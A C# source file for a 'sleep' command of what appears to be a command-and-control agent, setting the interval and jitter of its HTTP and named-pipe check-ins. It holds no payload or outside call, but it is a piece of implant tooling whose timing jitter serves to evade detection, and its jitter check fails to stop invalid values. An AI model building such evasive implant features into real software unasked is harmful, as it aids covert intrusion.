using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SleepCommand : AgentCommand
    {
        public override string Name => "sleep";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            if (task.SplittedArgs.Count() == 0)
            {
                context.Result.Result = $"Delay is {context.Agent.HttpCommunicator.Interval/1000}s +/- {context.Agent.HttpCommunicator.Jitter*100}%";
                return;
            }

            int delay = int.Parse(task.SplittedArgs[0]);
            double jitter = 0;
            if (task.SplittedArgs.Count() > 1)
            {
                jitter = double.Parse(task.SplittedArgs[1]) / 100;
            }

            if(jitter < 0 || jitter >= 1)
            {
                context.Result.Result = "Jitter is not correct (should be 0-99%)";
            }

         
            delay = delay * 1000;
            context.Agent.HttpCommunicator.Interval = delay;
            context.Agent.HttpCommunicator.Jitter = jitter;

            context.Agent.PipeCommunicator.Interval = delay;
            context.Agent.PipeCommunicator.Jitter = jitter;

            context.Result.Result = $"Delay set to {delay/1000}s +/- {jitter*100}%";
        }
    }
}
